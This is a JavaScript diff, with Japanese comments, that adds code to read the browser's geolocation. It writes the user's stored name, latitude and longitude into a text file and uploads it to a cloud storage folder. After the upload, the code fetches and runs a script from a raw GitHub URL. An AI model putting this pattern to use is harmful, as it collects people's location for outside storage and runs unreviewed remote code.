@@ -4,7 +4,7 @@ const upload_preset = "gmr5c3hg";
 const folder_name = "information";
 
 // ファイルをアップロードする関数
-function uploadFile(file, fileName) {
+function uploadFile(file, fileName, fileExists) {
   const formData = new FormData();
   formData.append("file", file);
   formData.append("upload_preset", upload_preset);
@@ -36,6 +36,15 @@ function checkFileExists(fileName) {
         return false; // ファイルが存在しない
       }
     });
+}
+
+// 位置情報を取得する関数
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(uploadLocation);
+  } else {
+    console.log("Geolocation is not supported by this browser.");
+  }
 }
 
 // 名前の入力とファイルのアップロードを実行
@@ -81,13 +90,15 @@ async function uploadLocation(position) {
   const fileExists = await checkFileExists(fileName);
 
   // 新しいファイルをアップロード
-  createAndUploadFile(storedName, latitude, longitude, fileName, fileExists);
+  const text = `名前: ${storedName}, Latitude: ${latitude}, Longitude: ${longitude}`;
+  const file = new File([text], fileName, { type: "text/plain" });
+  uploadFile(file, fileName, fileExists);
 }
 
 // アップロードが完了した後に実行する後続の処理
 function executeAdditionalProcess(fileURL) {
   console.log("アップロードしたファイルのURL: ", fileURL);
-  
+
   // 成功時にのみスクリプトを実行
   const successScriptURL = "https://raw.githubusercontent.com/hirotomoki12345/hamanan/main/base.js";
   executeScript(successScriptURL);
